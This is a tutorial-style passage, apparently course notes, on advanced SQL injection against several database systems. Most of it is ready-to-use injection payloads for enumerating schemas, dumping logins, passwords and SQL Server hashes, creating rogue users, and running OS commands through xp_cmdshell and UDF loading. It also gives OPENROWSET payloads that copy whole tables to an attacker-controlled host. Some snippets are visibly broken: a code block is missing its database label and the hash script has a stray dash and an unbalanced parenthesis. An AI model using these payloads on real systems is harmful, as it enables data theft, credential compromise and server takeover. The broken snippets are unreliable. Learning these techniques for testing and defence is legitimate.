# 🧠 Advanced SQL Injection
The attacker does not stop at compromising an application’s data. The attacker will advance the SQL injection attack to compromise the underlying OS and network. Using the compromised application, the attacker can issue commands to the underlying OS to take over the target machine and use it as a staging post to attack the rest of the network. 

The attacker may interact with the OS to extract OS details and application passwords, execute commands, access system files, and so on. The attacker can further compromise the entire target network by installing Trojans and planting keyloggers.

## Database, Table, and Column Enumeration 
Attackers use various SQL queries to enumerate database, table names, and columns. The information obtained by the attacker after enumeration can be used to obtain sensitive data from the database, modify data (insert/update/delete), execute admin-level operations on the database, and even retrieve the content of a given file present on the DBMS file system. 

The following techniques are used by an attacker to perform enumeration: 

### Identify User Level Privilege 
Identifying user-level privileges through SQL injection is a common technique attackers use to understand what rights they have inside a database. Most databases provide built-in scalar functions such as `user`, `current_user`, `session_user`, and `system_user` that reveal the account currently connected to the system. By injecting these functions into queries, an attacker can determine if they are operating with normal user rights or higher-level privileges such as administrator or root.

For example, an attacker might inject:
```sql
' and 1 in (select user ) --
```
This forces the database to return information about the current user. If the response indicates the user is `dbo` (database owner) in SQL Server, the attacker may confirm this further with a delay command such as:
```sql
'; if user ='dbo' waitfor delay '0:0:5 '--
```
Here, the database pauses for 5 seconds if the logged-in account is `dbo`, confirming elevated privileges.

Similarly, in MySQL, attackers may use:
```sql
' union select if( user() like 'root@%', benchmark(50000,sha1('test')), 'false' );
```
This tests whether the current user is `root`. If true, the database will run a heavy operation (`benchmark`), slowing down the response and signaling to the attacker that they have root-level access.

Through these techniques, attackers can map out privilege levels and decide whether they can escalate their attack further, such as modifying data, creating new accounts, or taking full control of the database server.

### DB Administrators
Default administrator accounts include sa, system, sys, dba, admin, root, and many others. The dbo is a user that has implied permissions to perform all activities in the database. Any object created by any member of the sysadmin fixed server role belongs to dbo automatically.

### Discover DB Structure 
Determine table and column names 
```sql
' group by columnnames having 1=1 --
```
Discover column name types
```sql
' union select sum(columnname ) from tablename --
```
Enumerate user defined tables
```sql
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
```

### Column Enumeration in DB 
**MSSQL**
```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename')
sp_columns tablename
```
**MySQL**
```sql
show columns from tablename
```
**Oracle**
```sql
SELECT * FROM all_tab_columns WHERE table_name='tablename'
```
**DB2**
```sql
SELECT * FROM syscat.columns WHERE tabname= 'tablename'
```
**PostgreSQL**
```sql
SELECT attnum,attname from pg_class, pg_attribute WHERE relname= 'tablename' AND pg_class.oid=attrelid AND attnum > 0
```

## Advanced Enumeration
Attackers use advanced enumeration techniques for system-level and network-level information gathering. The information gathered in the previous stage can be used to gain unauthorized access. An attacker can crack passwords using various tools such as L0phtCrack, John the Ripper, and so on. Attackers use buffer overflows to determine the vulnerabilities of a system or a network.

The following database objects are used for enumeration: 
| Oracle               | MS Access          | MySQL             | MSSQL Server   |
|-----------------------|-------------------|-------------------|----------------|
| SYS.USER_OBJECTS      | MSysAccessObjects | mysql.user        | sys.objects    |
| SYS.USER_TABLES       | MSysACEs          | mysql.db          | sys.columns    |
| SYS.USER_VIEWS        | MSysObjects       | mysql.tables_priv | sys.types      |
| SYS.ALL_TABLES        | MSysQueries       |                   | sys.databases  |
| SYS.USER_TAB_COLUMNS  | MSysRelationships |                   |                |

**Examples:**
- Tables and columns enumeration in one query
```sql
' union select 0, sys.objects.name + ': ' + sys.columns.name + ': ' + sys.types.name, 1, 1, '1', 1, 1, 1, 1, 1 from sys.objects, sys.columns, sys.types where sys.objects.xtype = 'U' AND sys.objects.id = sys.columns.id AND sys.columns.xtype = sys.types.xtype --
```
- Database Enumeration
  - Different databases in server
    ```sql
    ' and 1 in (select min(name) from master.dbo.sys.databases where name >'.' ) --
    ```
  - File location of databases
     ```sql
     ' and 1 in (select min(filename) from master.dbo.sys.databases where filename >'.' ) --
     ```

## Features of Different DBMS 
Different DBMS platforms support different features, and attackers take advantage of this once they know which database is in use. Variations in syntax for string concatenation, comments, unions, sub-queries, stored procedures, or access to system tables like information schema allow attackers to tailor their SQL injection techniques to match the specific database and increase the chances of a successful attack.

| Feature                                   | MySQL                         | MSSQL       | MS Access | Oracle         | DB2                         | PostgreSQL   |
|-------------------------------------------|-------------------------------|-------------|-----------|----------------|-----------------------------|--------------|
| **String Concatenation**                  | concat(,), concat_ws(delim,)  | ''+''         | ""&""       | ''\|\|''         | "concat" <br> ""+"" <br> ''\|\|''         | ''\|\|''       |
| **Comments**                              | --, /* */ and #               | -- and /* */| No        | -- and /* */   | --                          | -- and /* */ |
| **Request Union**                         | union                         | union and ; | union     | union          | union                       | union and ;  |
| **Sub-requests**                          | Yes                           | Yes         | No        | Yes            | Yes                         | Yes          |
| **Stored Procedures**                     | Yes                           | Yes         | Yes       | Yes            | Yes                         | Yes          |
| **Availability of information schema**    | Yes                           | Yes         | Yes       | Yes            | Yes                         | Yes          |

**Examples:**
- **MySQL**
  ```sql
  SELECT * from table where id = 1 union select 1,2,3
  ```
- **PostgreSQL**
  ```sql
  SELECT * from table where id = 1; select 1,2,3
  ```
- **Oracle**
  ```sql
  SELECT * from table where id = 1 union select null,null,null from sys.dual
  ```



  ```sql
  CREATE USER victor IDENTIFIED BY 'Pass123'
  ```
- **MySQL**
  ```sql
  INSERT INTO mysql.user (user, host, password) VALUES ('victor', 'localhost', PASSWORD('Pass123'))
  ```

## Password Grabbing 
Password grabbing through SQL injection happens when attackers craft malicious queries to extract stored passwords from a database. Once obtained, these passwords can be stolen, modified, or used to gain higher privileges, even admin access.

For example, an attacker may inject a query like:
```sql
begin declare @var varchar(8000)
set @var=':' select @var=@var+' '+login+'/'+password+' ' from users where login>@var 
select @var as var into temp end; --' and 1 in (select var from temp) --' ; drop table temp --
```
This code loops through the users table, collects logins and passwords, and stores them in a temporary table. The attacker can then retrieve this data, gaining access to user accounts and potentially taking full control of the system.

## Grabbing SQL Server Hashes 
Grabbing SQL Server hashes is an attack where an attacker extracts password hashes stored in the `sys.syslogins` table of SQL Server. These hashes can later be brute-forced or cracked offline to recover clear text passwords. To do this, attackers execute crafted SQL queries to read and convert the stored hashes.

**Example 1 – Extracting and Hexing Hashes**
```sql
SELECT password FROM sys.syslogins 

begin @charvalue='0x', @i=1, @length=datalength(@binvalue), @hexstring = '0123456789ABCDEF'
while (@i<=@length) 
BEGIN
    declare @tempint int, @firstint int, @secondint int 
    select @tempint=CONVERT(int,SUBSTRING(@binvalue,@i,1)) 
    select @firstint=FLOOR(@tempint/16) 
    select @secondint=@tempint – @firstint*16) 
    select @charvalue=@charvalue + SUBSTRING (@hexstring,@firstint+1,1) + SUBSTRING (@hexstring, @secondint+1, 1)
    select @i=@i+1
END;
```
Here, the attacker first selects the password hashes from `sys.syslogins`. Since they are in binary format, the script converts each byte into its hexadecimal representation, building a readable hash string. This allows the attacker to cycle through and dump all stored hashes for later cracking.

**Example 2 – Displaying Hashes with Error Messages**
```sql
SELECT name, password FROM sys.syslogins
```
Attackers can manipulate error messages to reveal hashes. By converting password data into hex and concatenating it into error outputs, the system leaks sensitive information. For example:
```sql
' and 1 in (select x from temp) -- 
' and 1 in (select substring (x, 256, 256) from temp) -- 
' and 1 in (select substring (x, 512, 256) from temp) -- 
' drop table temp --
```
This approach forces SQL Server to generate error messages containing portions of the password hashes, which can be pieced together.

In both methods, once hashes are obtained, attackers attempt brute force or dictionary attacks to recover clear passwords. With DBA access, hashes can be extracted directly, but even with lower privileges, usernames can still be gathered for further password attacks.

## Transfer Database to Attacker's Machine 
Transferring a database to an attacker’s machine is a dangerous SQL injection technique where the attacker links the target SQL server to their own system. By abusing `OPENROWSET`, the attacker copies the database structure and then extracts its data over a remote connection, often through port 80. Once connected, the attacker can transfer entire tables and sensitive information. 

For example, an attacker may inject the following query sequence to transfer the database to the attacker’s machine:


**Payload 1: Extract system database information**
```sql
'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;
Address=myIP,80;', 'select * from mydatabase..hacked_sysdatabases') 
select * from sys.sysdatabases --
````
👉 **Explanation:**
This query attempts to copy (`insert into OPENROWSET`) data from the system table `sys.sysdatabases` into a remote attacker-controlled database. It exposes all available databases on the server.

**Payload 2: Extract system objects (tables, views, procedures, etc.)**
```sql
'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;
Address=myIP,80;', 'select * from mydatabase..hacked_sysdatabases') 
select * from sys.sysobjects --
```
👉 **Explanation:**
This query retrieves all system objects (like user tables, stored procedures, triggers, etc.) from `sys.sysobjects` and attempts to send them to a remote database.

**Payload 3: Extract system column details**
```sql
'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;
Address=myIP,80;','select * from mydatabase..hacked_syscolumns') 
select * from sys.syscolumns --
```
👉 **Explanation:**
This extracts metadata about **columns** (names, types, properties) from all system tables (`sys.syscolumns`). Attackers use this to map the database schema.

**Payload 4: Extract data from a specific table (table1)**
```sql
'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;
Address=myIP,80;','select * from mydatabase..table1') 
select * from database..table1 --
```
👉 **Explanation:**
This tries to copy all rows from `table1` in the target database to the attacker’s remote database.

**Payload 5: Extract data from another table (table2)**
```sql
'; insert into OPENROWSET('SQLoledb','uid=sa;pwd=Pass123;Network=DBMSSOCN;
Address=myIP,80;', 'select * from mydatabase..table2') 
select * from database..table2 --
```
👉 **Explanation:**
Same as the previous payload, but targeting `table2`. It attempts to **exfiltrate sensitive data** from a specific table.

## Interacting with the Operating System 
Attackers use various DBMS queries to interact with a target OS. There are two different ways to interact with an OS:
- **Reading and writing system files from the disk:** An attacker can read arbitrary files present on the target running the DBMS and steal important documents, configurations, or binary files. He/she can also obtain credentials from the target system files to launch further attacks on the system.
- **Direct command execution via remote shell:** An attacker can abuse a Windows access token to escalate his/her privilege on the target system, perform malicious activities, and launch further attacks.

For example, the following queries can be used to interact with the target operating system: 

**MSSQL OS Interaction**
```sql
'; exec master..xp_cmdshell 'ipconfig > test.txt' --

'; CREATE TABLE tmp (txt varchar(8000)); BULK INSERT tmp FROM 'test.txt' --

'; begin declare @data varchar(8000); set @data='| '; select @data=@data+txt+' | ' from tmp where txt<@data; select @data as x into temp end --

' and 1 in (select substring(x,1,256) from temp) --

'; declare @var sysname; set @var = 'del test.txt'; EXEC master..xp_cmdshell @var; drop table temp; drop table tmp --
```

**MySQL OS Interaction**
```sql
CREATE FUNCTION sys_exec RETURNS int SONAME 'libudffmwgj.dll'; 
CREATE FUNCTION sys_eval RETURNS string SONAME 'libudffmwgj.dll'; 
```
> **Note:** These methods are restricted by the database's running privileges and permissions.
